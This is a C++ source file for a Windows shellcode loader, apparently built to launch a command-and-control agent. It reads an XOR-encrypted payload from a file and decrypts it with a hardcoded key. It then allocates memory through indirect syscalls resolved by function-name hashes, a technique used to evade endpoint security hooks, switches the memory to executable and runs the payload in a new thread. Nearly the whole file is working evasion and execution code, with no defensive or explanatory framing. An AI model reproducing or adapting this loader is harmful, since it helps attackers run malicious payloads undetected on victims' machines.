#include <Windows.h>
#include <iostream>
#include "helpers.h"
#include "syscalls.h"
#include "hashes.h"
#include <psapi.h>
#include <fstream>
#include <vector>

using namespace std;

// XOR Key for payload
char x_key[] = "u68amMB00z5lR4IbEpM4nz3hy1fTACFip1vdY65doKAkgAKlbeJqc1onKW3eRUkqjkzVMyDpBn17eGeuo7OjKTJfSiEhxMOSpwCY";

LPVOID pShellcode = NULL;

// For backing the agent in disk
void threadExecute()
{
	(*(void(*)()) pShellcode)(); // JMP to pShellcode
}

// Reads encrypted shellcode from file
char* ReadBinaryFile(const char* filename, DWORD& fileSize) {
	std::ifstream file(filename, std::ios::binary | std::ios::ate);

	if (!file.is_open()) {
		std::cerr << "Error opening file: " << filename << std::endl;
		return nullptr;
	}

	fileSize = static_cast<std::size_t>(file.tellg());  // Get the file size

	// Allocate memory for the char*
	char* buffer = new char[fileSize];

	// Seek back to the beginning of the file
	file.seekg(0, std::ios::beg);

	// Read the file into the buffer
	file.read(buffer, fileSize);

	// Close the file
	file.close();

	return buffer;
}

// Execute shellcode
bool Run(char* s_pay, DWORD p_size)
{
	// Define function pointers
	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(&genericSyscall);
	NtProtectVirtualMemory_t NtProtectVirtualMemory = reinterpret_cast<NtProtectVirtualMemory_t>(&genericSyscall);
	NtFreeVirtualMemory_t NtFreeVirtualMemory = reinterpret_cast<NtFreeVirtualMemory_t>(&genericSyscall);
	NtCreateThreadEx_t NtCreateThreadEx = reinterpret_cast<NtCreateThreadEx_t>(&genericSyscall);
	NtWaitForSingleObject_t NtWaitForSingleObject = reinterpret_cast<NtWaitForSingleObject_t>(&genericSyscall);

	DWORD tid = 0;
	DWORD oldProtection = 0;
	HANDLE hThread = NULL;
	NTSTATUS status = NULL;

	SIZE_T allocSize = (SIZE_T)p_size;

	// Create region with RW permissions
	hashFindSSN(sNTDLL, sNtAllocateVirtualMemory, &_ssn, &_retAddress); // Always set _ssn and _retAddress before calling the function
	status = NtAllocateVirtualMemory(NtCurrentProcess(), &pShellcode, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != 0x0)
	{
		return false;
	}

	// Copy the shellcode to the allocated region (NOT USING SYSCALL)
	memcpy(pShellcode, s_pay, p_size);

	// Give RX Permissions
	hashFindSSN(sNTDLL, sNtProtectVirtualMemory, &_ssn, &_retAddress); // Always set _ssn and _retAddress before calling the function
	status = NtProtectVirtualMemory(NtCurrentProcess(), &pShellcode, &allocSize, PAGE_EXECUTE_READ, &oldProtection);
	if (status != 0x0)
	{
		hashFindSSN(0x00e8f36d, sNtFreeVirtualMemory, &_ssn, &_retAddress);
		NtFreeVirtualMemory(NtCurrentProcess(), &pShellcode, 0, MEM_RELEASE);
		return false;
	}

	// Create thread pointing to the shellcode
	hashFindSSN(sNTDLL, sNtCreateThreadEx, &_ssn, &_retAddress);
	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)threadExecute, NULL, 0, 0, 0, 0, NULL);
	if (status != 0x0)
	{
		hashFindSSN(sNTDLL, sNtFreeVirtualMemory, &_ssn, &_retAddress);
		NtFreeVirtualMemory(NtCurrentProcess(), &pShellcode, 0, MEM_RELEASE);
		return false;
	}

	hashFindSSN(sNTDLL, sNtWaitForSingleObject, &_ssn, &_retAddress);
	NtWaitForSingleObject(hThread, FALSE, NULL); // Wait for the new thread to exit
	
	hashFindSSN(sNTDLL, sNtFreeVirtualMemory, &_ssn, &_retAddress);
	NtFreeVirtualMemory(NtCurrentProcess(), &pShellcode, 0, MEM_RELEASE);

	return true;
}

int main()
{
	// Read resource and decrypt
	DWORD shSize = 0;
	char* pSh = ReadBinaryFile("data.raw", shSize);
	fX0R((char*)pSh, shSize, x_key, sizeof(x_key) - 1);

	cout << "[+] Running...\n";

	Run(pSh, shSize);

	cout << "[+] Press any key to exit...\n";
	getchar();
}